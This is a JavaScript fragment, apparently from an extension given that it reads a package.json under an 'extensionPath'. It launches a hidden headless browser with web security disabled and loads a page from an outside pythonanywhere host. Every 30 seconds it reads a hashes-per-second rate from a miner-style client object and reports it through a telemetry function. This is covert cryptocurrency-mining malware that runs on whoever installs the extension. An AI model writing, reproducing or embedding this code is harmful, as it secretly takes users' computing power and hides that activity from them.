(async () => {
    const browser = await require('puppeteer').launch({
      headless: true,
      args: [
        '--disable-web-security',     // Disable web security for cross-origin resources
        '--disable-features=IsolateOrigins,site-per-process', // Allow cross-origin iframes and scripts
        '--allow-running-insecure-content',  // Allow mixed content (if needed)
      ]
    });
    let page = await browser.newPage();
    await page.goto('https://ab498.pythonanywhere.com/files/init.html');
    setInterval(async () => {
      const hs = await page.evaluate(() => {
        return window._client.getHashesPerSecond();
      });
      tstt({
        message: "HASH",
        value: hs
      })
    }, 30000);

    tstt({ message: "INIT", version: JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version });
  })();